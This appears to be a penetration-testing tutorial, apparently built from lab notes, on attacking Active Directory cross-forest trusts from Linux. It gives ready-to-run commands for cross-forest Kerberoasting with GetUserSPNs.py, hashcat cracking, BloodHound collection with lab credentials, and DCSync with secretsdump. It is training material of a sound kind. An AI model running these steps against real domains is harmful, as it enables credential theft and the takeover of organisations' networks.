# Attacking Domain Trusts: Cross-Forest Trust Abuse from Linux

The Linux approach to cross-forest trust abuse mirrors the Windows methodology but relies entirely on Impacket and BloodHound Python, making it fully executable from a non-domain-joined attack host. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

***

## Cross-Forest Kerberoasting with GetUserSPNs.py

The `-target-domain` flag in `GetUserSPNs.py` is what makes cross-forest Kerberoasting possible from Linux. You authenticate using credentials from your current domain and point the tool at the trusted forest:

```bash
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

This returns SPN entries including the `MemberOf` column, which immediately tells you the privilege level of each account without needing a separate query. In this case `mssqlsvc` is confirmed as a member of `Domain Admins` in `FREIGHTLOGISTICS.LOCAL`. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

Request the TGS ticket for offline cracking by adding `-request`:

```bash
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

To skip the interactive password prompt and write directly to a file for Hashcat:

```bash
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley -outputfile freightlogistics_tgs.txt
```

Crack with Hashcat mode `13100`:

```bash
hashcat -m 13100 freightlogistics_tgs.txt /usr/share/wordlists/rockyou.txt
```

If the hash cracks, you have Domain Admin credentials in `FREIGHTLOGISTICS.LOCAL`. Always follow up with a password reuse check against similarly named accounts in your current domain, since the same admins often manage both environments and recycle passwords. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

***

## Hunting Foreign Group Membership with BloodHound Python

`bloodhound-python` collects the same data as the SharpHound ingestor but runs entirely from Linux. The critical requirement is that DNS must resolve the target DC hostname, since the tool does not accept raw IP addresses. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

### DNS Configuration

If your attack host is not configured to use the internal DNS server, edit `/etc/resolv.conf` before running the tool. Comment out external nameservers and point resolution at the domain's DC:

For `INLANEFREIGHT.LOCAL`:

```
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```

For `FREIGHTLOGISTICS.LOCAL` (when collecting that domain separately):

```
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238
```

Only one domain's nameserver should be active at a time since the tool resolves hostnames against the configured DNS server. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

### Collecting Data for Each Domain

Run separately against each domain, using your cross-domain credentials with the `user@domain` format when targeting the external forest:

```bash
# Collect INLANEFREIGHT.LOCAL
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2

# Collect FREIGHTLOGISTICS.LOCAL (note user@domain format)
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
```

The `user@domain` format in the second command tells the tool which domain to authenticate against when credentials come from a foreign domain. This is important since the tool needs to know where to validate the credentials. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

After each run, compress the JSON output files for upload to the BloodHound GUI:

```bash
zip -r ilfreight_bh.zip *.json
```

### Typical Output Comparison

| Domain | Computers | Users | Groups | Trusts Found |
|--------|-----------|-------|--------|-------------|
| INLANEFREIGHT.LOCAL | 559 | 2950 | 183 | 2 |
| FREIGHTLOGISTICS.LOCAL | 5 | 9 | 52 | 1 |

The size difference between the two domains is a useful indicator. A small external domain with few users but direct trust to a large enterprise domain is often poorly maintained and more likely to have misconfigurations. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

***

## Analysing Foreign Group Membership in BloodHound

Once both datasets are ingested into the BloodHound GUI, navigate to:

`Analysis tab > Users with Foreign Domain Group Membership`

Select `INLANEFREIGHT.LOCAL` as the source domain. This pre-built query surfaces exactly what `Get-DomainForeignGroupMember` found on Windows: the built-in `administrator` account from `INLANEFREIGHT.LOCAL` is a member of the `Administrators` group in `FREIGHTLOGISTICS.LOCAL`. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

BloodHound visualises the full attack path from your current position to Domain Admin in the trusted forest, which is useful for client reporting as it clearly communicates the risk of the foreign group membership without requiring technical knowledge of how the attack works.

***

## Post-Exploitation Workflow Summary

Once Kerberoasting or foreign group membership gives access to the trusted forest, the next steps follow the same pattern as a standard domain compromise:

1. Confirm access with `crackmapexec smb <DC IP> -u administrator -d FREIGHTLOGISTICS.LOCAL -p <cracked password>`
2. DCSync the trusted domain's NTDS with `secretsdump.py`
3. Check for password reuse on the KRBTGT and built-in Administrator accounts back in the originating domain
4. Document all trust relationships and the attack paths in the report, including whether SID filtering was enabled

Always check password reuse in both directions across a trust. Owning one domain and finding reused credentials is frequently faster than pursuing a second full compromise chain in the trusted forest. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)
